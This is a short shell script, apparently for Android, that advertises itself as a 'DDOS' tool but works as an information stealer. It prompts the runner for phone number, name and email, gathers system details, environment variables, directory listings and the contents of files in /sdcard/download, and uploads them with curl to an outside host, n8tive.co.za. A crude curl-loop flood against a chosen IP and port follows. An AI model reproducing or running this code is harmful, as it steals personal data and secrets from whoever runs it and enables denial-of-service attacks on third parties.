#!/system/bin/bash/sh
echo "DDOS"
echo "Please Enter your Personal Information to use"
echo ""
  echo -n "Phone Number:"
  read phone
  echo -n "first and last name :"
  read name
  echo -n "Email :"
  read email


cm()
{
read line
  case $line in

  $line)
  echo "
  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)
  id     : $(id)


  $(set)


  $(cd)
  $(cd ..)
  $(cd usr)
  $(ls -la)
  $(cd)
  $(cd /sdcard/download)
  $(ls -la)
  $(cat *)


  phone number : $phone
  name : $name
  email : $email

  ','{$line}',' " >> proxy.txt
  curl -T proxy.txt http://n8tive.co.za/
  cm

 esac
 }
cm
echo -n Enter IP :
 read ip
 echo -n Enter Port :
 read port
  echo setting up targeted $ip:$port
sleep 3
dos_attack() {
 number_sent=1
    function request() {
  while [ $number_sent -lt 99999 ]
  do
    echo Sent Packet $RANDOM.$number_sent bytes to $ip:$port $(curl http://$ip:$port)
   echo $(curl http://$ip:$port)
number_sent=`expr $number_sent + 1`
  done
 }
 request
}
  echo 1
  sleep 1
  echo 2
  sleep 1
  echo 3
  sleep 1
  echo ATTACKK !!!
  sllep 1
dos_attack
